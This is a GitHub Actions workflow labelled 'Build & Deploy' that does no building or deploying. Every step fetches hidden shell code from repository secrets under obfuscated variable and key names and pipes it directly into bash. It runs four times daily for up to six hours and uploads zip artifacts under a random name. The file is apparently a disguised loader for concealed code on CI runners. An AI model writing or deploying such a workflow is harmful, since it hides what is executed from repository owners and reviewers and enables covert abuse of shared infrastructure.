name: Build & Deploy
on:
  workflow_dispatch:

  schedule:
    - cron: '47 3,9,15,21 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  run:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Build and run
        env:
          u939: ${{ secrets.u939 }}
        run: |
          printf '%s' "$u939" | jq -r .cwhs04121 | /bin/bash
          printf '%s' "$iknn745" | jq -r .ttmc17437 | /bin/bash
          echo $ylgcw5299 | jq -r .oihmd6 | /bin/bash
          printf '%s' "$djzo53" | jq -r .hyq281 | /bin/bash
          printf '%s' "$dq844" | jq -r .m01 | /bin/bash

      - name: Save output
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: yI0zxIjT
          path: "*.zip"
          retention-days: 1
